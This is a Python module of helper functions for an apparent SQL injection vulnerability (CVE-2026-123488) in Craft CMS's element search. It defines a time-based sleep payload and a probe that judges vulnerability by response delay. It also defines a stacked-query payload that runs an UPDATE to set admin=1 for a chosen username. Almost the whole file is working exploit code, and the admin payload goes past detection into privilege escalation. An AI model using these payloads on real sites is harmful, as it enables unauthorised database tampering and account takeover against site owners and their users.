#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-123488 Craft CMS element search SQLi helpers."""

from __future__ import annotations

from typing import Any, Dict, Optional

DETECT_SQL = "x')) or (select sleep({delay})); #"
STACKED_SQL = "x')) or 1=1; update {table} set admin=1 where username='{username}'; #"


def craft_search_sqli_params(attribute_sql: str) -> Dict[str, str]:
    return {
        "search[query]": "hello",
        "search[attribute]": attribute_sql,
    }


def craft_detect_payload(delay: int = 5) -> str:
    return DETECT_SQL.format(delay=max(1, int(delay)))


def craft_stacked_admin_payload(table: str = "users", username: str = "admin") -> str:
    table = (table or "users").strip() or "users"
    username = (username or "admin").replace("'", "")
    return STACKED_SQL.format(table=table, username=username)


def craft_sqli_timing_vulnerable(elapsed: float, delay: int) -> bool:
    return float(elapsed or 0) >= max(1, int(delay)) - 0.75


def probe_craft_element_search_sqli(
    http_get,
    search_path: str,
    *,
    delay: int = 5,
    timeout: Optional[float] = None,
) -> Dict[str, Any]:
    """
    Time-based check. ``http_get(path, params=..., timeout=...)`` -> response with .elapsed or None.
    """
    import time

    out: Dict[str, Any] = {
        "vulnerable": False,
        "elapsed": 0.0,
        "delay": int(delay),
        "error": "",
    }
    params = craft_search_sqli_params(craft_detect_payload(delay))
    t0 = time.monotonic()
    try:
        response = http_get(search_path, params=params, timeout=timeout or (delay + 15))
    except Exception as exc:
        out["error"] = str(exc)[:200]
        return out
    if response is not None and hasattr(response, "elapsed") and response.elapsed:
        out["elapsed"] = float(response.elapsed.total_seconds())
    else:
        out["elapsed"] = time.monotonic() - t0
    if response is None:
        out["error"] = "no_response"
        return out
    out["vulnerable"] = craft_sqli_timing_vulnerable(out["elapsed"], delay)
    return out
